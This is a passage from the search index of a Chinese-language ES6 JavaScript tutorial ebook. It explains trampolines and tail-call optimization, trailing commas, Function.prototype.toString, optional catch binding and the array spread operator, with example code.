<p>\u4e0a\u9762\u5c31\u662f\u8e66\u5e8a\u51fd\u6570\u7684\u4e00\u4e2a\u5b9e\u73b0\uff0c\u5b83\u63a5\u53d7\u4e00\u4e2a\u51fd\u6570<code>f</code>\u4f5c\u4e3a\u53c2\u6570\u3002\u53ea\u8981<code>f</code>\u6267\u884c\u540e\u8fd4\u56de\u4e00\u4e2a\u51fd\u6570\uff0c\u5c31\u7ee7\u7eed\u6267\u884c\u3002\u6ce8\u610f\uff0c\u8fd9\u91cc\u662f\u8fd4\u56de\u4e00\u4e2a\u51fd\u6570\uff0c\u7136\u540e\u6267\u884c\u8be5\u51fd\u6570\uff0c\u800c\u4e0d\u662f\u51fd\u6570\u91cc\u9762\u8c03\u7528\u51fd\u6570\uff0c\u8fd9\u6837\u5c31\u907f\u514d\u4e86\u9012\u5f52\u6267\u884c\uff0c\u4ece\u800c\u5c31\u6d88\u9664\u4e86\u8c03\u7528\u6808\u8fc7\u5927\u7684\u95ee\u9898\u3002</p> <p>\u7136\u540e\uff0c\u8981\u505a\u7684\u5c31\u662f\u5c06\u539f\u6765\u7684\u9012\u5f52\u51fd\u6570\uff0c\u6539\u5199\u4e3a\u6bcf\u4e00\u6b65\u8fd4\u56de\u53e6\u4e00\u4e2a\u51fd\u6570\u3002</p> <pre><code>function sum(x, y) {\n  if (y &gt; 0) {\n    return sum.bind(null, x + 1, y - 1);\n  } else {\n    return x;\n  }\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>sum</code>\u51fd\u6570\u7684\u6bcf\u6b21\u6267\u884c\uff0c\u90fd\u4f1a\u8fd4\u56de\u81ea\u8eab\u7684\u53e6\u4e00\u4e2a\u7248\u672c\u3002</p> <p>\u73b0\u5728\uff0c\u4f7f\u7528\u8e66\u5e8a\u51fd\u6570\u6267\u884c<code>sum</code>\uff0c\u5c31\u4e0d\u4f1a\u53d1\u751f\u8c03\u7528\u6808\u6ea2\u51fa\u3002</p> <pre><code>trampoline(sum(1, 100000))\n// 100001\n</code></pre> <p>\u8e66\u5e8a\u51fd\u6570\u5e76\u4e0d\u662f\u771f\u6b63\u7684\u5c3e\u9012\u5f52\u4f18\u5316\uff0c\u4e0b\u9762\u7684\u5b9e\u73b0\u624d\u662f\u3002</p> <pre><code>function tco(f) {\n  var value;\n  var active = false;\n  var accumulated = [];\n\n  return function accumulator() {\n    accumulated.push(arguments);\n    if (!active) {\n      active = true;\n      while (accumulated.length) {\n        value = f.apply(this, accumulated.shift());\n      }\n      active = false;\n      return value;\n    }\n  };\n}\n\nvar sum = tco(function(x, y) {\n  if (y &gt; 0) {\n    return sum(x + 1, y - 1)\n  }\n  else {\n    return x\n  }\n});\n\nsum(1, 100000)\n// 100001\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>tco</code>\u51fd\u6570\u662f\u5c3e\u9012\u5f52\u4f18\u5316\u7684\u5b9e\u73b0\uff0c\u5b83\u7684\u5965\u5999\u5c31\u5728\u4e8e\u72b6\u6001\u53d8\u91cf<code>active</code>\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u8fd9\u4e2a\u53d8\u91cf\u662f\u4e0d\u6fc0\u6d3b\u7684\u3002\u4e00\u65e6\u8fdb\u5165\u5c3e\u9012\u5f52\u4f18\u5316\u7684\u8fc7\u7a0b\uff0c\u8fd9\u4e2a\u53d8\u91cf\u5c31\u6fc0\u6d3b\u4e86\u3002\u7136\u540e\uff0c\u6bcf\u4e00\u8f6e\u9012\u5f52<code>sum</code>\u8fd4\u56de\u7684\u90fd\u662f<code>undefined</code>\uff0c\u6240\u4ee5\u5c31\u907f\u514d\u4e86\u9012\u5f52\u6267\u884c\uff1b\u800c<code>accumulated</code>\u6570\u7ec4\u5b58\u653e\u6bcf\u4e00\u8f6e<code>sum</code>\u6267\u884c\u7684\u53c2\u6570\uff0c\u603b\u662f\u6709\u503c\u7684\uff0c\u8fd9\u5c31\u4fdd\u8bc1\u4e86<code>accumulator</code>\u51fd\u6570\u5185\u90e8\u7684<code>while</code>\u5faa\u73af\u603b\u662f\u4f1a\u6267\u884c\u3002\u8fd9\u6837\u5c31\u5f88\u5de7\u5999\u5730\u5c06\u201c\u9012\u5f52\u201d\u6539\u6210\u4e86\u201c\u5faa\u73af\u201d\uff0c\u800c\u540e\u4e00\u8f6e\u7684\u53c2\u6570\u4f1a\u53d6\u4ee3\u524d\u4e00\u8f6e\u7684\u53c2\u6570\uff0c\u4fdd\u8bc1\u4e86\u8c03\u7528\u6808\u53ea\u6709\u4e00\u5c42\u3002</p>"},{"location":"ebook-JSES6-RYF/08-%E5%87%BD%E6%95%B0/#_21","title":"\u51fd\u6570\u53c2\u6570\u7684\u5c3e\u9017\u53f7","text":"<p>ES2017 \u5141\u8bb8\u51fd\u6570\u7684\u6700\u540e\u4e00\u4e2a\u53c2\u6570\u6709\u5c3e\u9017\u53f7\uff08trailing comma\uff09\u3002</p> <p>\u6b64\u524d\uff0c\u51fd\u6570\u5b9a\u4e49\u548c\u8c03\u7528\u65f6\uff0c\u90fd\u4e0d\u5141\u8bb8\u6700\u540e\u4e00\u4e2a\u53c2\u6570\u540e\u9762\u51fa\u73b0\u9017\u53f7\u3002</p> <pre><code>function clownsEverywhere(\n  param1,\n  param2\n) { /* ... */ }\n\nclownsEverywhere(\n  'foo',\n  'bar'\n);\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5982\u679c\u5728<code>param2</code>\u6216<code>bar</code>\u540e\u9762\u52a0\u4e00\u4e2a\u9017\u53f7\uff0c\u5c31\u4f1a\u62a5\u9519\u3002</p> <p>\u5982\u679c\u50cf\u4e0a\u9762\u8fd9\u6837\uff0c\u5c06\u53c2\u6570\u5199\u6210\u591a\u884c\uff08\u5373\u6bcf\u4e2a\u53c2\u6570\u5360\u636e\u4e00\u884c\uff09\uff0c\u4ee5\u540e\u4fee\u6539\u4ee3\u7801\u7684\u65f6\u5019\uff0c\u60f3\u4e3a\u51fd\u6570<code>clownsEverywhere</code>\u6dfb\u52a0\u7b2c\u4e09\u4e2a\u53c2\u6570\uff0c\u6216\u8005\u8c03\u6574\u53c2\u6570\u7684\u6b21\u5e8f\uff0c\u5c31\u52bf\u5fc5\u8981\u5728\u539f\u6765\u6700\u540e\u4e00\u4e2a\u53c2\u6570\u540e\u9762\u6dfb\u52a0\u4e00\u4e2a\u9017\u53f7\u3002\u8fd9\u5bf9\u4e8e\u7248\u672c\u7ba1\u7406\u7cfb\u7edf\u6765\u8bf4\uff0c\u5c31\u4f1a\u663e\u793a\u6dfb\u52a0\u9017\u53f7\u7684\u90a3\u4e00\u884c\u4e5f\u53d1\u751f\u4e86\u53d8\u52a8\u3002\u8fd9\u770b\u4e0a\u53bb\u6709\u70b9\u5197\u4f59\uff0c\u56e0\u6b64\u65b0\u7684\u8bed\u6cd5\u5141\u8bb8\u5b9a\u4e49\u548c\u8c03\u7528\u65f6\uff0c\u5c3e\u90e8\u76f4\u63a5\u6709\u4e00\u4e2a\u9017\u53f7\u3002</p> <pre><code>function clownsEverywhere(\n  param1,\n  param2,\n) { /* ... */ }\n\nclownsEverywhere(\n  'foo',\n  'bar',\n);\n</code></pre> <p>\u8fd9\u6837\u7684\u89c4\u5b9a\u4e5f\u4f7f\u5f97\uff0c\u51fd\u6570\u53c2\u6570\u4e0e\u6570\u7ec4\u548c\u5bf9\u8c61\u7684\u5c3e\u9017\u53f7\u89c4\u5219\u4fdd\u6301\u4e00\u81f4\u3002</p>"},{"location":"ebook-JSES6-RYF/08-%E5%87%BD%E6%95%B0/#functionprototypetostring","title":"Function.prototype.toString()","text":"<p>ES2019 \u5bf9\u51fd\u6570\u5b9e\u4f8b\u7684<code>toString()</code>\u65b9\u6cd5\u505a\u51fa\u4e86\u4fee\u6539\u3002</p> <p><code>toString()</code>\u65b9\u6cd5\u8fd4\u56de\u51fd\u6570\u4ee3\u7801\u672c\u8eab\uff0c\u4ee5\u524d\u4f1a\u7701\u7565\u6ce8\u91ca\u548c\u7a7a\u683c\u3002</p> <pre><code>function /* foo comment */ foo () {}\n\nfoo.toString()\n// function foo() {}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u51fd\u6570<code>foo</code>\u7684\u539f\u59cb\u4ee3\u7801\u5305\u542b\u6ce8\u91ca\uff0c\u51fd\u6570\u540d<code>foo</code>\u548c\u5706\u62ec\u53f7\u4e4b\u95f4\u6709\u7a7a\u683c\uff0c\u4f46\u662f<code>toString()</code>\u65b9\u6cd5\u90fd\u628a\u5b83\u4eec\u7701\u7565\u4e86\u3002</p> <p>\u4fee\u6539\u540e\u7684<code>toString()</code>\u65b9\u6cd5\uff0c\u660e\u786e\u8981\u6c42\u8fd4\u56de\u4e00\u6a21\u4e00\u6837\u7684\u539f\u59cb\u4ee3\u7801\u3002</p> <pre><code>function /* foo comment */ foo () {}\n\nfoo.toString()\n// \"function /* foo comment */ foo () {}\"\n</code></pre>"},{"location":"ebook-JSES6-RYF/08-%E5%87%BD%E6%95%B0/#try-catch-err","title":"try-catch err\u53c2\u6570\u7701\u7565","text":"<p>JavaScript \u8bed\u8a00\u7684<code>try...catch</code>\u7ed3\u6784\uff0c\u4ee5\u524d\u660e\u786e\u8981\u6c42<code>catch</code>\u547d\u4ee4\u540e\u9762\u5fc5\u987b\u8ddf\u53c2\u6570\uff0c\u63a5\u53d7<code>try</code>\u4ee3\u7801\u5757\u629b\u51fa\u7684\u9519\u8bef\u5bf9\u8c61\u3002</p> <pre><code>try {\n  // ...\n} catch (err) {\n  // \u5904\u7406\u9519\u8bef\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>catch</code>\u547d\u4ee4\u540e\u9762\u5e26\u6709\u53c2\u6570<code>err</code>\u3002</p> <p>\u5f88\u591a\u65f6\u5019\uff0c<code>catch</code>\u4ee3\u7801\u5757\u53ef\u80fd\u7528\u4e0d\u5230\u8fd9\u4e2a\u53c2\u6570\u3002\u4f46\u662f\uff0c\u4e3a\u4e86\u4fdd\u8bc1\u8bed\u6cd5\u6b63\u786e\uff0c\u8fd8\u662f\u5fc5\u987b\u5199\u3002ES2019 \u505a\u51fa\u4e86\u6539\u53d8\uff0c\u5141\u8bb8<code>catch</code>\u8bed\u53e5\u7701\u7565\u53c2\u6570\u3002</p> <pre><code>try {\n  // ...\n} catch {\n  // ...\n}\n</code></pre>"},{"location":"ebook-JSES6-RYF/09-%E6%95%B0%E7%BB%84/","title":"\u6570\u7ec4","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 26539  \u9605\u8bfb54\u5206\u949f</p>"},{"location":"ebook-JSES6-RYF/09-%E6%95%B0%E7%BB%84/#_2","title":"\u6269\u5c55\u8fd0\u7b97\u7b26...","text":""},{"location":"ebook-JSES6-RYF/09-%E6%95%B0%E7%BB%84/#_3","title":"\u542b\u4e49","text":"<p>\u6269\u5c55\u8fd0\u7b97\u7b26\uff08spread\uff09\u662f\u4e09\u4e2a\u70b9\uff08<code>...</code>\uff09\u3002\u5b83\u597d\u6bd4 rest \u53c2\u6570\u7684\u9006\u8fd0\u7b97\uff0c\u5c06\u4e00\u4e2a\u6570\u7ec4\u8f6c\u4e3a\u7528\u9017\u53f7\u5206\u9694\u7684\u53c2\u6570\u5e8f\u5217\u3002</p> <pre><code>console.log(...[1, 2, 3])\n// 1 2 3\n\nconsole.log(1, ...[2, 3, 4], 5)\n// 1 2 3 4 5\n\n[...document.querySelectorAll('div')]\n// [&lt;div&gt;, &lt;div&gt;, &lt;div&gt;]\n</code></pre> <p>\u8be5\u8fd0\u7b97\u7b26\u4e3b\u8981\u7528\u4e8e\u51fd\u6570\u8c03\u7528\u3002</p> <pre><code>function push(array, ...items) {\n  array.push(...items);\n}\n\nfunction add(x, y) {\n  return x + y;\n}\nlet numbers = [1, 2, 5];\nadd(...numbers); // \u7ed3\u679c\u662f\u628a\u524d\u4e24\u4e2a\u53c2\u6570\u52a0\u5230\u4e00\u8d77\uff083\uff09\uff0c\u7b2c\u4e09\u4e2a\u53c2\u6570\u4e0d\u4f1a\u52a0\uff0c\u4f5c\u7528\u5c31\u662f\u628a\u6570\u7ec4\u7684\u6bcf\u4e00\u9879\u63d0\u53d6\u51fa\u6765\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>array.push(...items)</code>\u548c<code>add(...numbers)</code>\u8fd9\u4e24\u884c\uff0c\u90fd\u662f\u51fd\u6570\u7684\u8c03\u7528\uff0c\u5b83\u4eec\u7684\u90fd\u4f7f\u7528\u4e86\u6269\u5c55\u8fd0\u7b97\u7b26\u3002\u8be5\u8fd0\u7b97\u7b26\u5c06\u4e00\u4e2a\u6570\u7ec4\uff0c\u53d8\u4e3a\u53c2\u6570\u5e8f\u5217\u3002</p> <p>\u6269\u5c55\u8fd0\u7b97\u7b26\u4e0e\u6b63\u5e38\u7684\u51fd\u6570\u53c2\u6570\u53ef\u4ee5\u7ed3\u5408\u4f7f\u7528\uff0c\u975e\u5e38\u7075\u6d3b\u3002</p> <pre><code>function f(v, w, x, y, z) {\n  return v + w + x + y + z;\n}\nconst args = [0, 1];\nf(-1, ...args, 2, ...[3]); // 5\n</code></pre> <p>\u6269\u5c55\u8fd0\u7b97\u7b26\u540e\u9762\u8fd8\u53ef\u4ee5\u653e\u7f6e\u8868\u8fbe\u5f0f\u3002</p> <pre><code>const arr = [ ...(x &gt; 0 ? ['a'] : []), 'b'];\n</code></pre> <p>\u5982\u679c\u6269\u5c55\u8fd0\u7b97\u7b26\u540e\u9762\u662f\u4e00\u4e2a\u7a7a\u6570\u7ec4\uff0c\u5219\u4e0d\u4ea7\u751f\u4efb\u4f55\u6548\u679c\u3002</p> <pre><code>[...[], 1]\n// [1]\n</code></pre> <p>\u6ce8\u610f\uff0c\u53ea\u6709\u51fd\u6570\u8c03\u7528\u65f6\uff0c\u6269\u5c55\u8fd0\u7b97\u7b26\u624d\u53ef\u4ee5\u653e\u5728\u5706\u62ec\u53f7\u4e2d\uff0c\u5426\u5219\u4f1a\u62a5\u9519\u3002</p> <pre><code>(...[1, 2])\n// Uncaught SyntaxError: Unexpected number\n\nconsole.log((...[1, 2]))\n// Uncaught SyntaxError: Unexpected number\n\nconsole.log(...[1, 2])\n// 1 2\n</code></pre> <p>\u4e0a\u9762\u4e09\u79cd\u60c5\u51b5\uff0c\u6269\u5c55\u8fd0\u7b97\u7b26\u90fd\u653e\u5728\u5706\u62ec\u53f7\u91cc\u9762\uff0c\u4f46\u662f\u524d\u4e24\u79cd\u60c5\u51b5\u4f1a\u62a5\u9519\uff0c\u56e0\u4e3a\u6269\u5c55\u8fd0\u7b97\u7b26\u6240\u5728\u7684\u62ec\u53f7\u4e0d\u662f\u51fd\u6570\u8c03\u7528\u3002</p>"},{"location":"ebook-JSES6-RYF/09-%E6%95%B0%E7%BB%84/#apply","title":"\u66ff\u4ee3\u51fd\u6570\u7684 apply \u65b9\u6cd5","text":"<p>\u7531\u4e8e\u6269\u5c55\u8fd0\u7b97\u7b26\u53ef\u4ee5\u5c55\u5f00\u6570\u7ec4\uff0c\u6240\u4ee5\u4e0d\u518d\u9700\u8981<code>apply</code>\u65b9\u6cd5\uff0c\u5c06\u6570\u7ec4\u8f6c\u4e3a\u51fd\u6570\u7684\u53c2\u6570\u4e86\u3002</p> <pre><code>// ES5 \u7684\u5199\u6cd5\nfunction f(x, y, z) {\n  // ...\n}\nvar args = [0, 1, 2];\nf.apply(null, args);\n\n// ES6\u7684\u5199\u6cd5\nfunction fun(a, b, c) {\n  console.log(a,b,c);\n} \nlet arr = [0,1,2];\nfun(...arr);\n</code></pre> <p>\u7b80\u5316\uff1a\u6c42\u6570\u7ec4\u6700\u5927\u503c</p> <pre><code>// ES5 \u7684\u5199\u6cd5\nMath.max.apply(null, [14, 3, 77])\n\n// ES6 \u7684\u5199\u6cd5\nMath.max(...[14, 3, 77])\n\n// \u7b49\u540c\u4e8e\nMath.max(14, 3, 77);\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7531\u4e8e JavaScript \u4e0d\u63d0\u4f9b\u6c42\u6570\u7ec4\u6700\u5927\u5143\u7d20\u7684\u51fd\u6570\uff0c\u6240\u4ee5\u53ea\u80fd\u5957\u7528<code>Math.max</code>\u51fd\u6570\uff0c\u5c06\u6570\u7ec4\u8f6c\u4e3a\u4e00\u4e2a\u53c2\u6570\u5e8f\u5217\uff0c\u7136\u540e\u6c42\u6700\u5927\u503c\u3002\u6709\u4e86\u6269\u5c55\u8fd0\u7b97\u7b26\u4ee5\u540e\uff0c\u5c31\u53ef\u4ee5\u76f4\u63a5\u7528<code>Math.max</code>\u4e86\u3002</p> <p>\u53e6\u4e00\u4e2a\u4f8b\u5b50\u662f\u901a\u8fc7<code>push</code>\u51fd\u6570\uff0c\u5c06\u4e00\u4e2a\u6570\u7ec4\u6dfb\u52a0\u5230\u53e6\u4e00\u4e2a\u6570\u7ec4\u7684\u5c3e\u90e8\u3002</p> <pre><code>// ES5\u7684 \u5199\u6cd5\nvar arr1 = [0, 1, 2];\nvar arr2 = [3, 4, 5];\nArray.prototype.push.apply(arr1, arr2);\n\n// ES6 \u7684\u5199\u6cd5\nlet arr1 = [0, 1, 2];\nlet arr2 = [3, 4, 5];\narr1.push(...arr2);\n\n// ES5\nnew (Date.bind.apply(Date, [null, 2015, 1, 1]))\n// ES6\nnew Date(...[2015, 1, 1]);\n</code></pre>"},{"location":"ebook-JSES6-RYF/09-%E6%95%B0%E7%BB%84/#_4","title":"\u6269\u5c55\u8fd0\u7b97\u7b26\u7684\u5e94\u7528","text":"<p>\uff081\uff09\u590d\u5236\u6570\u7ec4</p> <p>\u6570\u7ec4\u662f\u590d\u5408\u7684\u6570\u636e\u7c7b\u578b\uff0c\u76f4\u63a5\u590d\u5236\u7684\u8bdd\uff0c\u53ea\u662f\u590d\u5236\u4e86\u6307\u5411\u5e95\u5c42\u6570\u636e\u7ed3\u6784\u7684\u6307\u9488\uff0c\u800c\u4e0d\u662f\u514b\u9686\u4e00\u4e2a\u5168\u65b0\u7684\u6570\u7ec4\u3002</p> <pre><code>const a1 = [1, 2];\nconst a2 = a1;\n\na2[0] = 2;\na1 // [2, 2]\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>a2</code>\u5e76\u4e0d\u662f<code>a1</code>\u7684\u514b\u9686\uff0c\u800c\u662f\u6307\u5411\u540c\u4e00\u4efd\u6570\u636e\u7684\u53e6\u4e00\u4e2a\u6307\u9488\u3002\u4fee\u6539<code>a2</code>\uff0c\u4f1a\u76f4\u63a5\u5bfc\u81f4<code>a1</code>\u7684\u53d8\u5316\u3002</p> <p>ES5 \u53ea\u80fd\u7528\u53d8\u901a\u65b9\u6cd5\u6765\u590d\u5236\u6570\u7ec4\u3002</p> <pre><code>const a1 = [1, 2];\nconst a2 = a1.concat();\n\na2[0] = 2;\na1 // [1, 2]\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>a1</code>\u4f1a\u8fd4\u56de\u539f\u6570\u7ec4\u7684\u514b\u9686\uff0c\u518d\u4fee\u6539<code>a2</code>\u5c31\u4e0d\u4f1a\u5bf9<code>a1</code>\u4ea7\u751f\u5f71\u54cd\u3002</p> <p>\u6269\u5c55\u8fd0\u7b97\u7b26\u63d0\u4f9b\u4e86\u590d\u5236\u6570\u7ec4\u7684\u7b80\u4fbf\u5199\u6cd5\u3002</p> <pre><code>const a1 = [1, 2];\n// \u5199\u6cd5\u4e00\nconst a2 = [...a1];\n// \u5199\u6cd5\u4e8c\nconst [...a2] = a1;\n</code></pre> <p>\uff082\uff09\u5408\u5e76\u6570\u7ec4</p> <p>\u6269\u5c55\u8fd0\u7b97\u7b26\u63d0\u4f9b\u4e86\u6570\u7ec4\u5408\u5e76\u7684\u65b0\u5199\u6cd5\u3002</p> <pre><code>const arr1 = ['a', 'b'];\nconst arr2 = ['c'];\nconst arr3 = ['d', 'e'];\n\n// ES5 \u7684\u5408\u5e76\u6570\u7ec4\narr1.concat(arr2, arr3);\n// [ 'a', 'b', 'c', 'd', 'e' ]\n\n// ES6 \u7684\u5408\u5e76\u6570\u7ec4\n[...arr1, ...arr2, ...arr3]\n// [ 'a', 'b', 'c', 'd', 'e' ]\n</code></pre> <p>\u4e0d\u8fc7\uff0c\u8fd9\u4e24\u79cd\u65b9\u6cd5\u90fd\u662f\u6d45\u62f7\u8d1d\uff0c\u4f7f\u7528\u7684\u65f6\u5019\u9700\u8981\u6ce8\u610f\u3002</p> <pre><code>const a1 = [{ foo: 1 }];\nconst a2 = [{ bar: 2 }];\n\nconst a3 = a1.concat(a2);\nconst a4 = [...a1, ...a2];\n\na3[0] === a1[0] // true\na4[0] === a1[0] // true\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>a3</code>\u548c<code>a4</code>\u662f\u7528\u4e24\u79cd\u4e0d\u540c\u65b9\u6cd5\u5408\u5e76\u800c\u6210\u7684\u65b0\u6570\u7ec4\uff0c\u4f46\u662f\u5b83\u4eec\u7684\u6210\u5458\u90fd\u662f\u5bf9\u539f\u6570\u7ec4\u6210\u5458\u7684\u5f15\u7528\uff0c\u8fd9\u5c31\u662f\u6d45\u62f7\u8d1d\u3002\u5982\u679c\u4fee\u6539\u4e86\u539f\u6570\u7ec4\u7684\u6210\u5458\uff0c\u4f1a\u540c\u6b65\u53cd\u6620\u5230\u65b0\u6570\u7ec4\u3002</p> <p>\uff083\uff09\u4e0e\u89e3\u6784\u8d4b\u503c\u7ed3\u5408</p> <p>\u6269\u5c55\u8fd0\u7b97\u7b26\u53ef\u4ee5\u4e0e\u89e3\u6784\u8d4b\u503c\u7ed3\u5408\u8d77\u6765\uff0c\u7528\u4e8e\u751f\u6210\u6570\u7ec4\uff08\u8fd9\u91cc\u662f\u6269\u5c55\u8fd0\u7b97\u7b26\u7684\u53cd\u5411\u8fd0\u7b97\uff0c\u5c06\u591a\u4e2aitem\u8f6c\u5316\u6210\u4e00\u4e2a\u6570\u7ec4\u5e76\u8f93\u51fa\uff09\uff0c\u8fd9\u91cc\u7684\u6269\u5c55\u8fd0\u7b97\u7b26\u9700\u8981\u653e\u5728\u89e3\u6784\u8d4b\u503c\u7684\u6700\u540e\u4e00\u4e2a\u53c2\u6570\u4e2d\uff08\u653e\u5728\u524d\u9762\u4f1a\u62a5\u9519\uff09\uff1b</p> <pre><code>// ES5\na = list[0], rest = list.slice(1)\n// ES6\n[a, ...rest] = list\n</code></pre> <p>\u4e0b\u9762\u662f\u53e6\u5916\u4e00\u4e9b\u4f8b\u5b50\u3002</p> <pre><code>const [first, ...rest] = [3,4,5];\nfirst === 3;\nrest === [4,5];\n\nconst [first, ...rest] = [];\nfirst // undefined\nrest  // []\n\nconst [first, ...rest] = [\"foo\"];\nfirst  // \"foo\"\nrest   // []\n</code></pre> <p>\uff084\uff09\u5b57\u7b26\u4e32</p> <p>\u6269\u5c55\u8fd0\u7b97\u7b26\u8fd8\u53ef\u4ee5\u5c06\u5b57\u7b26\u4e32\u8f6c\u4e3a\u771f\u6b63\u7684\u6570\u7ec4\u3002</p> <pre><code>[...'hello']\n// [ \"h\", \"e\", \"l\", \"l\", \"o\" ]\n</code></pre> <p>\u4e0a\u9762\u7684\u5199\u6cd5\uff0c\u6709\u4e00\u4e2a\u91cd\u8981\u7684\u597d\u5904\uff0c\u90a3\u5c31\u662f\u80fd\u591f\u6b63\u786e\u8bc6\u522b\u56db\u4e2a\u5b57\u8282\u7684 Unicode \u5b57\u7b26\u3002</p> <pre><code>'x\\uD83D\\uDE80y'.length // 4\n[...'x\\uD83D\\uDE80y'].length // 3\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u7684\u7b2c\u4e00\u79cd\u5199\u6cd5\uff0cJavaScript \u4f1a\u5c06\u56db\u4e2a\u5b57\u8282\u7684 Unicode \u5b57\u7b26\uff0c\u8bc6\u522b\u4e3a 2 \u4e2a\u5b57\u7b26\uff0c\u91c7\u7528\u6269\u5c55\u8fd0\u7b97\u7b26\u5c31\u6ca1\u6709\u8fd9\u4e2a\u95ee\u9898\u3002\u56e0\u6b64\uff0c\u6b63\u786e\u8fd4\u56de\u5b57\u7b26\u4e32\u957f\u5ea6\u7684\u51fd\u6570\uff0c\u53ef\u4ee5\u50cf\u4e0b\u9762\u8fd9\u6837\u5199\u3002</p> <pre><code>function length(str) {\n  return [...str].length;\n}\n\nlength('x\\uD83D\\uDE80y') // 3\n</code></pre> <p>\u51e1\u662f\u6d89\u53ca\u5230\u64cd\u4f5c\u56db\u4e2a\u5b57\u8282\u7684 Unicode \u5b57\u7b26\u7684\u51fd\u6570\uff0c\u90fd\u6709\u8fd9\u4e2a\u95ee\u9898\u3002\u56e0\u6b64\uff0c\u6700\u597d\u90fd\u7528\u6269\u5c55\u8fd0\u7b97\u7b26\u6539\u5199\u3002</p> <pre><code>let str = 'x\\uD83D\\uDE80y';\n\nstr.split('').reverse().join('')\n// 'y\\uDE80\\uD83Dx'\n\n[...str].reverse().join('')\n// 'y\\uD83D\\uDE80x'\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5982\u679c\u4e0d\u7528\u6269\u5c55\u8fd0\u7b97\u7b26\uff0c\u5b57\u7b26\u4e32\u7684<code>reverse</code>\u64cd\u4f5c\u5c31\u4e0d\u6b63\u786e\u3002</p> <p>\uff085\uff09\u5b9e\u73b0\u4e86 Iterator \u63a5\u53e3\u7684\u5bf9\u8c61</p> <p>\u4efb\u4f55\u5b9a\u4e49\u4e86\u904d\u5386\u5668\uff08Iterator\uff09\u63a5\u53e3\u7684\u5bf9\u8c61\uff08\u53c2\u9605 Iterator \u4e00\u7ae0\uff09\uff0c\u90fd\u53ef\u4ee5\u7528\u6269\u5c55\u8fd0\u7b97\u7b26\u8f6c\u4e3a\u771f\u6b63\u7684\u6570\u7ec4\u3002</p> <pre><code>let nodeList = document.querySelectorAll('div');\nlet array = [...nodeList];\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>querySelectorAll</code>\u65b9\u6cd5\u8fd4\u56de\u7684\u662f\u4e00\u4e2a<code>NodeList</code>\u5bf9\u8c61\u3002\u5b83\u4e0d\u662f\u6570\u7ec4\uff0c\u800c\u662f\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\u3002\u8fd9\u65f6\uff0c\u6269\u5c55\u8fd0\u7b97\u7b26\u53ef\u4ee5\u5c06\u5176\u8f6c\u4e3a\u771f\u6b63\u7684\u6570\u7ec4\uff0c\u539f\u56e0\u5c31\u5728\u4e8e<code>NodeList</code>\u5bf9\u8c61\u5b9e\u73b0\u4e86 Iterator \u3002</p> <pre><code>Number.prototype[Symbol.iterator] = function*() {\n  let i = 0;\n  let num = this.valueOf();\n  while (i &lt; num) {\n    yield i++;\n  }\n}\n\nconsole.log([...5]) // [0, 1, 2, 3, 4]\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5148\u5b9a\u4e49\u4e86<code>Number</code>\u5bf9\u8c61\u7684\u904d\u5386\u5668\u63a5\u53e3\uff0c\u6269\u5c55\u8fd0\u7b97\u7b26\u5c06<code>5</code>\u81ea\u52a8\u8f6c\u6210<code>Number</code>\u5b9e\u4f8b\u4ee5\u540e\uff0c\u5c31\u4f1a\u8c03\u7528\u8fd9\u4e2a\u63a5\u53e3\uff0c\u5c31\u4f1a\u8fd4\u56de\u81ea\u5b9a\u4e49\u7684\u7ed3\u679c\u3002</p> <p>\u5bf9\u4e8e\u90a3\u4e9b\u6ca1\u6709\u90e8\u7f72 Iterator \u63a5\u53e3\u7684\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff0c\u6269\u5c55\u8fd0\u7b97\u7b26\u5c31\u65e0\u6cd5\u5c06\u5176\u8f6c\u4e3a\u771f\u6b63\u7684\u6570\u7ec4\u3002</p> <pre><code>let arrayLike = {\n  '0': 'a',\n  '1': 'b',\n  '2': 'c',\n  length: 3\n};\n\n// TypeError: Cannot spread non-iterable object.\nlet arr = [...arrayLike];\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>arrayLike</code>\u662f\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff0c\u4f46\u662f\u6ca1\u6709\u90e8\u7f72 Iterator \u63a5\u53e3\uff0c\u6269\u5c55\u8fd0\u7b97\u7b26\u5c31\u4f1a\u62a5\u9519\u3002\u8fd9\u65f6\uff0c\u53ef\u4ee5\u6539\u4e3a\u4f7f\u7528<code>Array.from</code>\u65b9\u6cd5\u5c06<code>arrayLike</code>\u8f6c\u4e3a\u771f\u6b63\u7684\u6570\u7ec4\u3002</p> <p>\uff086\uff09Map \u548c Set \u7ed3\u6784\uff0cGenerator \u51fd\u6570</p> <p>\u6269\u5c55\u8fd0\u7b97\u7b26\u5185\u90e8\u8c03\u7528\u7684\u662f\u6570\u636e\u7ed3\u6784\u7684 Iterator \u63a5\u53e3\uff0c\u56e0\u6b64\u53ea\u8981\u5177\u6709 Iterator \u63a5\u53e3\u7684\u5bf9\u8c61\uff0c\u90fd\u53ef\u4ee5\u4f7f\u7528\u6269\u5c55\u8fd0\u7b97\u7b26\uff0c\u6bd4\u5982 Map \u7ed3\u6784\u3002</p> <pre><code>let map = new Map([\n  [1, 'one'],\n  [2, 'two'],\n  [3, 'three'],\n]);\n\nlet arr = [...map.keys()]; // [1, 2, 